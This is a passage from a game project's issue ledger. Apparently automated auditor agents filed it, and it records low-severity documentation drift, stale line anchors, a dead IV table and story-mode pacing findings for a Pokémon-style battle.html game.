**Blast radius**: Cosmetic — the docs themselves repeatedly warn "line numbers drift; the symbol name is the durable anchor," and the symbols still resolve via `find-anchor`. battle.html grew from ~28k LOC (when most anchors were written) to ~54.8k LOC. No behavioral impact; just stale jump-to references across `STORY_MODE_FLOW.md`, `STORY_MODE_CATCH_INTEGRATION_RISK.md`, `STORY_NARRATIVE_VARIANTS.md`, and `PROGRESSION_CURVE_MASTER.md`.

**Fix sketch**: Optional bulk refresh — re-run `node scripts/debug/symbol-index.mjs` and regenerate the `battle.html:LINE` anchors from symbol lookups, or simply accept drift since the symbol names are the contract. Lowest priority.

**Verification**: `node scripts/debug/spec-drift.mjs` reports 0 drifted (if a refresh pass is done).

---

## <a id="ISSUE-403"></a> ISSUE-403: Doc `battle.html:LINE` anchors stale — 18/50 references drifted (cluster)

---
id: ISSUE-403
severity: P3
category: dx
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~30097
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 0c17b73a170d
confidence: high
status: open
---

**Title**: Doc `battle.html:LINE` anchors stale — 18/50 references drifted (cluster)

**Evidence**:
```
STORY_MODE_FLOW.md:53   claims battle.html:21273 for STORY_EVENTS_RAW → now @30097
STORY_MODE_FLOW.md:225  claims battle.html:30702 for continuePostGame  → now @53475
STORY_MODE_FLOW.md:584  claims battle.html:34883 for makeWildBuild     → now @49108
STORY_NARRATIVE_VARIANTS.md:612 claims battle.html:30566 for STORY_BEATS → now @38912
STORY_MODE_CATCH_INTEGRATION_RISK.md:91 claims battle.html:21528 for POKEMART_ITEMS → now @10211
```

**Repro**: `node scripts/debug/spec-drift.mjs` → `tests/reports/spec-drift.md`. 18 of 50 inline `battle.html:LINE` references no longer point at the named symbol (battle.html has grown to ~4.05 MB / line refs predate that). The named symbols all still exist — only the line numbers rotted.

**Blast radius**: Low. Misleads anyone who jumps to a literal line; the `find-anchor` skill already resolves symbols, so this is a doc-hygiene nit, not a correctness bug. Notably FLOW §9 line 225 still cites `continuePostGame()` as `battle.html:30702` and §10 line 269 cites `battle.html:22191` for the `sm` defaults — both far off.

**Fix sketch**: Either strip the `:LINE` suffixes from doc references (keep symbol names only, since `find-anchor` resolves them) or run a one-time pass to refresh them. Prefer stripping — line numbers will rot again on the next insertion.

**Verification**: `node scripts/debug/spec-drift.mjs` reports 0 drifted references (or the docs no longer carry literal line numbers).

---

## <a id="ISSUE-404"></a> ISSUE-404: Doc `battle.html:LINE` anchors stale in surviving specs — 24/44 drifted (post-cleanup cluster; updates ISSUE-330)

---
id: ISSUE-404
severity: P3
category: dx
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~30629
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: b46ddfa8984f
confidence: high
status: open
---

**Title**: Doc `battle.html:LINE` anchors stale in surviving specs — 24/44 drifted (post-cleanup cluster; updates ISSUE-330)

**Evidence**:
```
STORY_MODE_FLOW.md:52            claims battle.html:21273  for STORY_EVENTS_RAW  → now ~30629
docs/EVOLUTION_FLOW_REBUILD.md:33 claims battle.html:27975 for STORY_EVENTS_RAW  → now ~30629
docs/STORY_NARRATIVE_VARIANTS.md:612 claims battle.html:30566 for STORY_BEATS    → now ~39606
docs/PROGRESSION_CURVE_MASTER.md:143 claims battle.html:33298 for STORY_BUILD_TIER → now ~36882
docs/EVOLUTION_FLOW_REBUILD.md:88 claims battle.html:37361 for VOUCHER_KEYS       → now ~46650
```

**Repro**: `node scripts/debug/spec-drift.mjs` → `tests/reports/spec-drift.md`: 24 of 44 inline `battle.html:LINE` refs across the 4 surviving specs + README no longer point at the named symbol (battle.html is now ~61.8k lines; most refs predate that). Every named symbol still resolves via `find-anchor` — only the line numbers rotted. EVOLUTION_FLOW_REBUILD.md carries the worst drift (anchors ~28k vs reality ~30–53k). Two non-anchor count survivors ride along: STORY_NARRATIVE_VARIANTS.md:8 still says "68-row" timeline (actual 67; FLOW/CURVE were fixed by commit 3929088 — this is the last "68" survivor) and PROGRESSION_CURVE_MASTER.md:52 says "44 are Battle rows" (actual 48 Battle-type rows).

**Blast radius**: Low — `find-anchor` already resolves symbols, so this is doc hygiene, not correctness. This is the post-cleanup refresh of ISSUE-330/337/338 (which referenced now-deleted docs); the surviving-doc count is 24/44.

**Fix sketch**: Strip the `:LINE` suffixes from doc references (keep the durable symbol names — `find-anchor` resolves them), since line numbers re-rot on the next insertion. While there, fix the two count survivors (NARRATIVE_VARIANTS "68-row"→67, CURVE "44 Battle rows"→48).

**Verification**: `node scripts/debug/spec-drift.mjs` reports 0 drifted refs (or the surviving docs carry no literal line numbers); no surviving doc says "68 rows".

---

## <a id="ISSUE-405"></a> ISSUE-405: Service-timeline pacing — City1 post-gym hub is a dead zone (no new "thing to do")

---
id: ISSUE-405
severity: P3
category: balance
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~29009
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6287bc4c5a37
confidence: high
status: open
---

**Title**: Service-timeline pacing — City1 post-gym hub is a dead zone (no new "thing to do")

**Evidence**:
```text
City0 pre-gym : Professor, Pokémart, Move Tutor, Nature Rater  (+ Center, Fan Club injected)
City1 pre-gym : Professor, Pokémart, Gym                       (NO new facility vs City0)
City1 post-gym: Pokémart, Leave City                          (DEAD — nothing new; Daycare unlocks here but only as egg-quest)
City2 pre-gym : Link Station, Stone Sage, Stone Shop, Move Tutor  (3 NEW facilities debut at once — clumped)
```

**Repro**: Extracted from `STORY_EVENTS_RAW` City rows + `FACILITY_DEBUT_CITY` (29085). First-appearance map: Center/Mart/Tutor/Nature/FanClub = C0; **C1 introduces nothing new**; Link+StoneShop+StoneSage all debut **together at C2**; Dojo+EVTrainer+Safari all debut **together at C4**; Colress C6; Dept Store C6. So the drip is: rich C0 → flat C1 → triple-debut C2 → C3 (Nature Rater returns) → quad-event C4 → Casino C5 → Colress+Dept C6.

**Blast radius**: The maintainer explicitly wants "a steady drip of new things to do." Current pacing is clumped (C2 triple, C4 quad) with a genuine dead zone at C1 (the first post-gym hub has only Pokémart). Daycare DOES unlock at C1's gym win but presents only as a one-time egg quest, and the redesign moves it to C2 anyway.

**Fix sketch**: Spread debuts: move ONE of {Link, Stone Shop, Stone Sage} earlier to C1 (post-gym), and stagger Dojo (C4) vs EV Trainer (keep C4) vs Safari (C4) so C3 or C5 gets a fresh facility instead of three landing at C4. REDESIGN_PLAN §8a already flags the GL4–5 "dead zone" on the enemy curve; this is the FACILITY-debut analog.

**Verification**: Re-extract per-city action lists; confirm every city 1–8 introduces ≥1 first-appearance service.

---

## <a id="ISSUE-406"></a> ISSUE-406: STORY_EVENTS_RAW has 67 array rows (incl. 2 'Hall of Fame' string matches) — mandate/spec cite "68 rows"

---
id: ISSUE-406
severity: P3
category: data
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~29008
file: battle.html
agents: [story-mode-investigator]
fingerprint: 1351f59a0b47
confidence: medium
status: open
---

**Title**: STORY_EVENTS_RAW has 67 array rows (incl. 2 'Hall of Fame' string matches) — mandate/spec cite "68 rows"

**Evidence**:
```text
STORY_EVENTS_RAW.length = 67 (array entries 29009..29078)
Row IDs (col 0) range 0..68 but are NON-contiguous and out of order:
  row 68 sits at array index 1 (intro Rival), row 12 (mid Rival) at index 19, etc.
```

**Repro**: `STORY_EVENTS_RAW` literal spans 29009–29078, 67 rows. The audit mandate and CODEBASE_MAP say "68 rows". The discrepancy is because event IDs (column 0) are durable keys assigned across history (max id 68) and are NOT array indices — migrations inserted/removed rows over time. This is a documentation-count drift, not a data bug: `GYM_CITY_LEADER_EVENT`, `STORY_BEATS`, and `trainerAssignments` all correctly key on the id or the array position as appropriate.

**Blast radius**: Doc-only. Reinforces finding #9: any tooling that assumes id == index will break (REDESIGN_PLAN §6 already warns).

**Fix sketch**: Update CODEBASE_MAP / mandate references to "67 rows; event IDs 0..68 non-contiguous, keyed by column 0".

**Verification**: `node -e` count of the literal == 67.

---

## <a id="ISSUE-407"></a> ISSUE-407: STORY_EVENTS_RAW resolves to 67 rows in harness vs 68 stated in spec/mandate

---
id: ISSUE-407
severity: P3
category: data
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~30037
file: battle.html
agents: [story-mode-investigator]
fingerprint: d62e9395acd6
confidence: low
status: open
---

**Title**: STORY_EVENTS_RAW resolves to 67 rows in harness vs 68 stated in spec/mandate

**Evidence**:
```js
// jsdom harness: STORY_EVENTS_RAW.length === 67
// Mandate / STORY_MODE_FLOW reference 68 rows.
```

**Repro**: loadEngine() then read window.STORY_EVENTS_RAW.length -> 67. May be gen-filter at boot in the harness (default gens) or a genuine off-by-one vs the spec's row count. Worth a quick reconcile since GYM_CITY_LEADER_EVENT and intro-rival index logic key off this array.

**Blast radius**: Timeline-index-derived logic (catch tutorial gate, legendary gate row 55, GYM_CITY_LEADER_EVENT). pasteur-owned timeline.

**Fix sketch**: Reconcile spec's "68 rows" against the live array; update whichever is stale (likely the doc).

**Verification**: Count STORY_EVENTS_RAW rows at boot with default settings and compare to STORY_MODE_FLOW.

---

## <a id="ISSUE-408"></a> ISSUE-408: Timeline is 67 rows; STORY_MODE_FLOW.md (and this update's brief) still say "68 rows"

---
id: ISSUE-408
severity: P3
category: inconsistency
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: 30492 (array of 67 rows)
file: battle.html
agents: [story-mode-investigator]
fingerprint: 8d651a30fcb3
confidence: high
status: fixed-claude/relaxed-bell-2X3Ys
---

**Title**: Timeline is 67 rows; STORY_MODE_FLOW.md (and this update's brief) still say "68 rows"

**Evidence**: jsdom harness reports `STORY_EVENTS_RAW.length === 67`. The canonical spec and the Wave-3 brief both cite "68 rows." Last row is `[67,'Battle','Mystery Figure',...]` (a row-ID of 67, but array index 66). The row-ID/array-index conflation is the same family as the City-3 bug above — easy to mis-cite a row by its ID and land on the wrong array slot.

**Repro**: boot harness, `console.log(STORY_EVENTS_RAW.length)` → 67. (Prior-audit ISSUE-178; re-verified.)

**Blast radius**: Spec/doc drift only. No runtime impact, but it propagates the "row 67 = array idx 67" mental model that bites derived maps (`GYM_CITY_LEADER_EVENT`).

**Fix sketch**: Doc edit in STORY_MODE_FLOW.md ("67 rows; final row-ID is 67 at array index 66"). pasteur owns the canon.

---

## <a id="ISSUE-409"></a> ISSUE-409: STORY_MODE_FLOW §4 still specs the flat Safari weights g1:3/g2:22/g3:50/g4:25; live code is a badge curve (_SAFARI_GRADE_CURVE_BY_BADGES)

---
id: ISSUE-409
severity: P3
category: inconsistency
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~30629
file: battle.html
agents: [story-mode-investigator]
fingerprint: 562a9e06fc9e
confidence: medium
status: open
---

**Title**: STORY_MODE_FLOW §4 still specs the flat Safari weights g1:3/g2:22/g3:50/g4:25; live code is a badge curve (_SAFARI_GRADE_CURVE_BY_BADGES)

**Evidence**:
```js
const _SAFARI_GRADE_CURVE_BY_BADGES = {
  3: { g1:0, g2:5,  g3:60, g4:35 }, ... 8: { g1:5, g2:50, g3:40, g4:5 }
};
// STORY_MODE_FLOW §4: "SAFARI_GRADE_WEIGHTS g1:3 / g2:22 / g3:50 / g4:25"
```

**Repro**: §4 and §15g of the SAME spec disagree — §4 keeps the old flat table, §15g documents the badge curve that actually ships. The mandate's "verify weights g1:3/g2:22/g3:50/g4:25" matches the stale §4. Confirms ISSUE-223.

**Blast radius**: Doc-internal inconsistency. Live Safari is a badge curve (city4 = badges 3 = {g2:5,g3:60,g4:35}); a reader trusting §4 would mis-tune. Other Safari constants (MAX_ENCOUNTERS 6, BALLS_PER_SESSION 15, BALL_MULT 1.35, ENTRY_COST 10000) all match spec.

**Fix sketch**: Update §4's Safari-weights row to reference `_SAFARI_GRADE_CURVE_BY_BADGES` / point to §15g, or fold §15g's table into §4 so there's one source of truth.

**Verification**: §4 and §15g agree on the live Safari weights.

---

## <a id="ISSUE-410"></a> ISSUE-410: `STORY_IV_TIER_RANGES` is dead — superseded by `STORY_IV_TIER_CENTER`, zero consumers

---
id: ISSUE-410
severity: P3
category: refactor
anchor_symbol: STORY_IV_TIER_RANGES
current_line_hint: ~33305
file: battle.html
agents: [consistency-auditor]
fingerprint: 14dd0d6f939b
confidence: high
status: open
---

**Title**: `STORY_IV_TIER_RANGES` is dead — superseded by `STORY_IV_TIER_CENTER`, zero consumers

**Evidence**:
```js
const STORY_IV_TIER_RANGES = Object.freeze({
    1: { min: 0,  max: 15 }, 2: { min: 10, max: 22 },
    3: { min: 18, max: 28 }, 4: { min: 26, max: 31 }
});
// ...comment 2 lines below: "(Replaces the wide uniform STORY_IV_TIER_RANGES bands.)"
const STORY_IV_TIER_CENTER = Object.freeze({ 1: 8, 2: 16, 3: 23, 4: 28 });
// grep STORY_IV_TIER_RANGES → only the decl + the comment that supersedes it. No reads.
```

**Repro**: `grep -n STORY_IV_TIER_RANGES battle.html` → definition + one comment, no consumers. `_rollTieredIVs` reads `STORY_IV_TIER_CENTER` instead.

**Blast radius**: None functionally (dead). Confusion risk: a future tuner could edit the wrong (dead) IV table and see no effect — a known curve-tuning footgun. Two IV tables that look like they both drive enemy IVs but only one does.

**Fix sketch**: Delete `STORY_IV_TIER_RANGES` (behaviour-preserving dead-table removal, grep-verified) and fold its "aces get top quartile" doc note into the `STORY_IV_TIER_CENTER` comment if still relevant.

**Verification**: grep returns 0 hits; `_rollTieredIVs` unchanged; engine tests green.

---

## <a id="ISSUE-411"></a> ISSUE-411: THREE story IV tables coexist — `STORY_IV_TIER_RANGES` is fully dead; `STORY_IV_TIER_CENTER` is Frontier-only; only `STORY_IV_CITY_*` is the live story curve

---
id: ISSUE-411
severity: P3
category: inconsistency
anchor_symbol: STORY_IV_TIER_RANGES
current_line_hint: ~33305
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 3c02d9edba9f
confidence: high
status: open
---

**Title**: THREE story IV tables coexist — `STORY_IV_TIER_RANGES` is fully dead; `STORY_IV_TIER_CENTER` is Frontier-only; only `STORY_IV_CITY_*` is the live story curve

**Evidence**:
```js
const STORY_IV_TIER_RANGES = Object.freeze({1:{min:0,max:15},...}); // 33305 — 0 readers
const STORY_IV_TIER_CENTER  = Object.freeze({1:8,2:16,3:23,4:28});  // 33315 — read only by _rollTieredIVs
const STORY_IV_CITY_TRAINER = Object.freeze([...]);                 // 33331 — the LIVE story table
// 37347: slot.build.ivs = (_foeCity < 0) ? _rollTieredIVs(...)   // Frontier ONLY
//                                         : _rollCityIVs('trainer', ...) // story
```

**Repro**: `grep -n STORY_IV_TIER_RANGES battle.html` → only the declaration (33305) + a comment (33314); zero readers. `grep -n _rollTieredIVs` → only call site is 37348, inside the `_foeCity < 0` (Frontier/generator) branch. In story mode (`_foeCity >= 0`) IVs come exclusively from `_rollCityIVs` reading `STORY_IV_CITY_TRAINER`/`STORY_IV_CITY_WILDPROF`. So the live STORY IV authority is the city tables, not the tier tables.

**Blast radius**: Tuning footgun (extends spec-drift fp on the dead IV table, which noted only `STORY_IV_TIER_RANGES` superseded by `STORY_IV_TIER_CENTER`). The fuller picture: a maintainer editing `STORY_IV_TIER_CENTER` to retune story difficulty changes NOTHING in story mode (it only affects post-HoF Frontier rematches); editing `STORY_IV_TIER_RANGES` changes nothing anywhere. The real story IV knob is `STORY_IV_CITY_TRAINER` + `_trainerDifficultyStep`.

**Fix sketch**: Delete `STORY_IV_TIER_RANGES` (dead). Relabel `STORY_IV_TIER_CENTER`/`_rollTieredIVs` as Frontier-only in name/comment, or fold Frontier into the city-band system. Document `STORY_IV_CITY_TRAINER` as the single story IV source-of-truth (STORY_OVERHAUL_PLAN §4 "ONE city-by-city build-staging config").

**Verification**: One IV table governs story foes; dead table removed; comments name which table each context (story vs Frontier) consumes.

---

## <a id="ISSUE-412"></a> ISSUE-412: docs/STORY_MODE_AUDIT.md is stale — most of its flagged issues are now fixed (SAVE_VER 14→22)

---
id: ISSUE-412
severity: P3
category: dx
anchor_symbol: STORY_MODE_AUDIT
current_line_hint: docs/STORY_MODE_AUDIT.md
file: docs/STORY_MODE_AUDIT.md
agents: [story-mode-investigator]
fingerprint: bd78781b71ff
confidence: high
status: open
---

**Title**: docs/STORY_MODE_AUDIT.md is stale — most of its flagged issues are now fixed (SAVE_VER 14→22)

**Evidence**:
Prior audit cites SAVE_VER=14, 68 rows, line numbers in the 21k–28k range, "Mystery Figure sprite unconditionally Cyrus", "GYM_CITY_LEADER_EVENT hard-coded map", "RIVAL_ATTACK_TYPE_DECAY ÷30", "Hard pays ×0.92", "league boost stacks multiplicatively", "mystery prof breaks if party < 6". Verified this session against current code (SAVE_VER=22):
- GYM_CITY_LEADER_EVENT is now DERIVED from STORY_EVENTS_RAW at boot (1.3 fixed).
- Mystery Figure is a deliberate single identity "The First" / Red sprite (4.x / 1.x fixed by design).
- RIVAL_ATTACK_TYPE_DECAY removed; rival uses a scored cycling counter-type pool (1.2 fixed).
- Hard coin mult floored at ×1.00, Challenge ×1.10 (2.1 fixed).
- League boost now stacks ADDITIVELY, killing the cliff (2.5 fixed).
- Professor "full" is cap-aware via `_storyMaxPartySize`, swap flow intact (1.9 fixed).
- Per-leader victory lines exist (LEADER_VICTORY_LINES, data-driven) (Fun #1 fixed).
- Post-HoF Mystery win now grants a real bundle, not a dead-end reward (2.6 fixed).

**Repro**: Compare doc claims to current anchors via find-anchor.

**Blast radius**: Audit hygiene — future agents re-flag fixed issues if they trust the doc. Several prior-audit items genuinely remain (e.g. casino still a coin-flip + slots/roulette only, signature-mon probability still per-trainer) and should be re-triaged separately.

**Fix sketch**: Add a "STATUS as of SAVE_VER 22 / branch endgame-crucible" header to the audit doc marking the resolved items, or migrate the still-open ones into ISSUE_LEDGER.md and archive the doc.

**Verification**: The doc no longer presents fixed issues as open.

---

## <a id="ISSUE-413"></a> ISSUE-413: 6+ stale `battle.html:LINE` refs in STORY_MODE_CATCH_INTEGRATION_RISK.md (avg drift ~9000 lines)

---
id: ISSUE-413
severity: P3
category: dx
anchor_symbol: STORY_MODE_CATCH_INTEGRATION_RISK.md
file: docs/STORY_MODE_CATCH_INTEGRATION_RISK.md
agents: [spec-drift-auditor]
fingerprint: 3c47a061e632
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 6+ stale `battle.html:LINE` refs in STORY_MODE_CATCH_INTEGRATION_RISK.md (avg drift ~9000 lines)

**Evidence**:
```
doc-line  | symbol hinted                      | claimed | actual
40        | badges, _storyProgressFactor       | 22481   | 13168 / 31385
41        | _rivalScoreAttackTypeVsParty       | 22706   | 31604
43        | hasTeamRoom, rivalGateActive       | 23611   | 35922 / 35940
47        | isFull, rolls                      | 24317   | 36885 / 36913
52        | usedNames, usedFamilies            | 24515   | 14180 / 36947
54        | sm                                 | 26484   | 13166
```
This doc is the largest single source of drifted refs in the report (24 of 50 total drifts).

**Repro**: `node scripts/debug/spec-drift.mjs && sed -n '25,55p' tests/reports/spec-drift.md`.

**Blast radius**: A doc named "risk" implies it should be read carefully on every catch-pipeline change; stale anchors actively mislead readers tracking how the catch flow interacts with Rival logic, save schema, and PC capacity.

**Fix sketch**: Single sweep through this doc, converting `battle.html:LINE` patterns to `(SYMBOL)` annotations. Special attention to lines 40-55, which form the spec's high-density anchor block. Add the convention to `docs/STORY_MODE_DESIGN_DECISIONS.md` as "rule: never quote line numbers in design docs".

**Verification**: `node scripts/debug/spec-drift.mjs` reports ≤2 drift entries under this doc.

---

## <a id="ISSUE-414"></a> ISSUE-414: Doc `battle.html:LINE` anchors still stale (50 refs, 18 drifted) despite PR #140 "fix"

---
id: ISSUE-414
severity: P3
category: dx
anchor_symbol: STORY_MODE_CATCH_INTEGRATION_RISK.md
current_line_hint: n/a
file: docs/STORY_MODE_CATCH_INTEGRATION_RISK.md
agents: [spec-drift-auditor]
fingerprint: 29bf2f08d270
confidence: high
status: open
---

**Title**: Doc `battle.html:LINE` anchors still stale (50 refs, 18 drifted) despite PR #140 "fix"

**Evidence**:
```
Fresh node scripts/debug/spec-drift.mjs: 18/50 battle.html:LINE refs drifted.
Representative (claimed -> actual symbol location):
  STORY_MODE_FLOW.md:53        STORY_EVENTS_RAW     21273 -> 29008
  STORY_MODE_FLOW.md:123       getMonGrade          28560 -> 13809
  CATCH_INTEGRATION_RISK.md:47 _rivalScoreAttackTypeVsParty 22706 -> 33118
  NARRATIVE_VARIANTS.md:612    STORY_BEATS          30566 -> 35521
  NARRATIVE_VARIANTS.md:618    MYSTERY_FIGURE_IDENTITIES 26426 -> 29759
ref counts today: STORY_MODE_FLOW=10, CATCH_INTEGRATION_RISK=30, NARRATIVE_VARIANTS=10
```

**Repro**: `node scripts/debug/spec-drift.mjs && sed -n '1,90p' tests/reports/spec-drift.md`. Prior findings (2026-05-22) were marked `fixed-claude/sharp-keller-eZEDN`; `git log` shows PR #140 merged, yet 50 `battle.html:LINE` refs remain and battle.html has since grown to 54,266 lines, so they have re-drifted.

**Blast radius**: Readers following line jumps land in unrelated code (avg drift ~5-8k lines). CATCH_INTEGRATION_RISK.md (30 refs) is the densest offender — a "risk" doc meant to be read on every catch-pipeline change. Symbol *names* still resolve; only the line numbers mislead.

**Fix sketch**: Adopt the prior fix-sketch's own recommendation that was never applied: replace every `battle.html:LINE` with a symbol-only annotation (`` `SYMBOL` `` + "resolve via find-anchor"), and add the "never embed line numbers in design docs" rule to STORY_MODE_DESIGN_DECISIONS so it stops recurring. One clustered sweep, not 18 edits.

**Verification**: `grep -coE 'battle\.html:[0-9]+' STORY_MODE_FLOW.md docs/STORY_MODE_CATCH_INTEGRATION_RISK.md docs/STORY_NARRATIVE_VARIANTS.md` → 0; `node scripts/debug/spec-drift.mjs` reports 0 drift.

---

## <a id="ISSUE-415"></a> ISSUE-415: 9 of 10 `battle.html:LINE` refs in STORY_MODE_FLOW.md are stale (avg drift ~7000 lines)

---
id: ISSUE-415
severity: P3
category: dx
anchor_symbol: STORY_MODE_FLOW.md
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: a2c0649750f6
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 9 of 10 `battle.html:LINE` refs in STORY_MODE_FLOW.md are stale (avg drift ~7000 lines)

**Evidence**:
```
STORY_MODE_FLOW.md doc-line  | claimed battle.html line | actual location
 47 (STORY_EVENTS_RAW)       | 21273                    | 27969 (+6696)
117 (catchRate, getMonGrade) | 28560                    | 13062 (-15498)
217 (STORY_EVENTS_RAW)       | 30702                    | 27969 (-2733)
576 (makeWildBuild)          | 34883                    | 39858 (+4975)
```
Full report at `tests/reports/spec-drift.md`. Only 1/10 refs in this doc still resolves cleanly via the symbol table — the rest reference symbols at lines that no longer host them (or have no inferrable symbol).

**Repro**: `node scripts/debug/spec-drift.mjs && head -25 tests/reports/spec-drift.md`.

**Blast radius**: Anyone who follows STORY_MODE_FLOW.md's line numbers to inspect the implementation lands in unrelated code. Docs still readable for *symbol* references, just not line jumps.

**Fix sketch**: One sweep: re-resolve every `battle.html:LINE` via `find-anchor`, rewrite as `battle.html` (no line) plus `(`SYMBOL`)`. Future-proof: never embed line numbers in design docs — they drift the moment a function is added above.

**Verification**: After sweep, `node scripts/debug/spec-drift.mjs` reports ≤1 drift entry under STORY_MODE_FLOW.md.

---

## <a id="ISSUE-416"></a> ISSUE-416: STORY_MODE_FLOW.md PC cap of 10 contradicts shipped PC_BOX_CAP=30

---
id: ISSUE-416
severity: P3
category: data
anchor_symbol: STORY_MODE_FLOW.md
current_line_hint: 30
file: STORY_MODE_FLOW.md
agents: [story-mode-investigator]
fingerprint: 85733dc0b897
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: STORY_MODE_FLOW.md PC cap of 10 contradicts shipped PC_BOX_CAP=30

**Evidence**:
```
STORY_MODE_FLOW.md §1 (line 30): "PC | Pure storage. Flat array, cap 10 …"
STORY_MODE_FLOW.md §7 (line 168): "PC Storage — Deposit, withdraw, release. Capacity 10 — intentionally tight …"
STORY_MODE_FLOW.md §14, A2 (line 414): "Flat-array PC, cap 10 (revised down from the prior audit's 60 …)"

battle.html:38560 → const PC_BOX_CAP = 30;
```
Three separate spec mentions all say 10. Code says 30. Sibling fingerprint `fad97b9dadac` files the same drift from the code direction.

**Repro**: `grep -nE "cap.?10|Capacity 10" STORY_MODE_FLOW.md` returns three hits; `grep -nE "PC_BOX_CAP" battle.html` returns one hit at 30.

**Blast radius**: Spec is the canonical source per `CODEBASE_MAP.md`. Any agent reading the spec to seed a fix lands on the wrong number.

**Fix sketch**: Either bump the spec from 10 → 30 (if 30 is intentional — likely, given the Pokédex collection arc that was added v17+), or drop code to 10. Pair with fingerprint `fad97b9dadac`.

**Verification**: After fix, spec and code agree on a single value.

---

## <a id="ISSUE-417"></a> ISSUE-417: Doc line anchors stale across 4 specs (still drifting post-v24; cluster)

---
id: ISSUE-417
severity: P3
category: dx
anchor_symbol: STORY_NARRATIVE_VARIANTS
current_line_hint: n/a
file: docs/STORY_NARRATIVE_VARIANTS.md
agents: [spec-drift-auditor]
fingerprint: 15a2b3eb1024
confidence: high
status: open
---

**Title**: Doc line anchors stale across 4 specs (still drifting post-v24; cluster)

**Evidence**:
```text
spec-drift.mjs: 23/43 battle.html:LINE refs no longer match the named symbol. Representative:
  STORY_MODE_FLOW.md:52         claims battle.html:21273 STORY_EVENTS_RAW   → actual ~30583
  STORY_NARRATIVE_VARIANTS.md:612 claims :30566 STORY_BEATS               → actual 39503
  STORY_NARRATIVE_VARIANTS.md:616 claims :30916 roamingLegendary          → not a symbol (cold-open key)
  PROGRESSION_CURVE_MASTER.md:39  claims :29001 STORY_EVENTS_RAW          → actual 30583
  docs/EVOLUTION_FLOW_REBUILD.md:90 claims :37361 VOUCHER_KEYS            → actual 46469
```

**Repro**: `node scripts/debug/spec-drift.mjs` → tests/reports/spec-drift.md. Every NAMED symbol still resolves via `find-anchor`; only the line numbers rotted (battle.html is now ~61.8k lines). This overlaps ledger ISSUE-360 (STORY_NARRATIVE_VARIANTS anchors) but is re-surfaced here as the single cluster across all four surviving specs post-v24, and the spec-drift tool's DOCS list omits the docs/story-design/*.md files entirely (STORY_3TRACK / FLOW_AUDIT / WANDER anchors are never scanned).

**Blast radius**: Low — anchors are documented point-in-time and the symbol is the durable reference. Two non-anchor count survivors ride along: STORY_NARRATIVE_VARIANTS.md:8 "68-row" (actual 67; already ledger ISSUE-190/353/361) and PROGRESSION_CURVE_MASTER.md:52 "44 are Battle rows" (actual 48 Battle-type rows).

**Fix sketch**: Batch-refresh the cited lines via `find-anchor`, or (better) strip raw `battle.html:LINE` numbers from the docs and rely on symbol names + ANCHOR_INDEX.md. Add docs/story-design/*.md to the `DOCS` array in scripts/debug/spec-drift.mjs so those anchors are tracked too.

**Verification**: `node scripts/debug/spec-drift.mjs` reports 0 drifted refs (or the docs no longer carry line numbers); the story-design subdir is included in the scan.

---

## <a id="ISSUE-418"></a> ISSUE-418: 5+ stale `battle.html:LINE` refs in STORY_NARRATIVE_VARIANTS.md (variant-system anchors moved 3-5k lines)

---
id: ISSUE-418
severity: P3
category: dx
anchor_symbol: STORY_NARRATIVE_VARIANTS.md
file: docs/STORY_NARRATIVE_VARIANTS.md
agents: [spec-drift-auditor]
fingerprint: b63a7fd17310
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 5+ stale `battle.html:LINE` refs in STORY_NARRATIVE_VARIANTS.md (variant-system anchors moved 3-5k lines)

**Evidence**:
```
doc-line | symbol                       | claimed | actual
339      | pending                      | 30916   | 17218
600      | STORY_BEATS                  | 30566   | 33787
601      | STORY_COLD_OPENS             | 30592   | 33813
602      | STORYLINE_VARIANTS           | 30815   | 35011
606      | MYSTERY_FIGURE_IDENTITIES    | 26426   | 28705
607      | _showIntroRivalColdOpen      | 33069   | 37866
```
The variant system is the most actively edited area of battle.html (CHANGELOG 2026-05-20: "12 sections all additive"), so line refs drift fastest here.

**Repro**: `node scripts/debug/spec-drift.mjs && sed -n '60,75p' tests/reports/spec-drift.md`.

**Blast radius**: This doc is the canonical guide for adding a 9th storyline variant; readers following its anchors land in wrong functions. STORY_BEATS / STORY_COLD_OPENS / STORYLINE_VARIANTS are the three keystone consts a variant author touches.

**Fix sketch**: Re-resolve via `find-anchor`, replace with symbol-only annotations. The six symbols here are stable in the index — re-link them and the doc is self-healing across future refactors.

**Verification**: `node scripts/debug/spec-drift.mjs` reports 0 drift entries under this doc.

---

## <a id="ISSUE-419"></a> ISSUE-419: Spec/mandate says timeline is "68 rows"; STORY_EVENTS_RAW has 67 (array idx 0–66), and rowId 68 is the intro Rival at array idx 1

---
id: ISSUE-419
severity: P3
category: inconsistency
anchor_symbol: STORY_RIVAL_ROW_INTRO
current_line_hint: ~33665
file: battle.html
agents: [story-mode-investigator]
fingerprint: 8b2bced8d3b7
confidence: high
status: open
---

**Title**: Spec/mandate says timeline is "68 rows"; STORY_EVENTS_RAW has 67 (array idx 0–66), and rowId 68 is the intro Rival at array idx 1

**Evidence**:
```js
const STORY_RIVAL_ROW_INTRO = 68;   // a ROW ID, not an array index
// STORY_EVENTS_RAW.length === 67 (City rows + 49 Battle + 1 HoF), array idx 0..66.
// Mystery Figure = rowId 67 = array idx 66 (the last row).
```

**Repro**: Harness: `STORY_EVENTS_RAW.length === 67`; intro Rival (rowId 68) at array idx 1; Mystery Figure (rowId 67) at array idx 66. The agent mandate ("68 rows"), STORY_MODE_FLOW §1 ("67 rows / idx 0–66, unchanged" — itself self-inconsistent with the "68 rows" framing elsewhere), and ISSUE-185 all collide.

